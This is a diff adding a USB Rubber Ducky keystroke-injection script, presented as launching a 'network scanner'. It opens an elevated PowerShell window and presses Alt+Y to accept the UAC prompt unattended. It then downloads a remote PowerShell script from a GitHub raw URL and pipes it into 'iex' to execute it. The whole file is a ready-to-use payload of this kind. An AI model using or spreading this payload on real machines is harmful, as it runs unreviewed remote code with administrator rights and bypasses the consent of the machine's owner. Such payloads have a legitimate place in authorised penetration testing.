@@ -1,0 +1,23 @@
+REM Network Scanner Rubber Ducky Script (English Keyboard Layout)
+REM Opens PowerShell as administrator and executes the remote script
+REM Author: CeresF3b
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 2000
+
+REM UAC Management (press Yes)
+ALT y
+DELAY 1500
+
+REM Execute the remote command to download and run the script
+STRING irm https://raw.githubusercontent.com/CeresF3b/NetworkScanner/main/Scanner.ps1 | iex
+DELAY 500
+ENTER
+
+REM End of script
+REM The PowerShell script will display the scan results
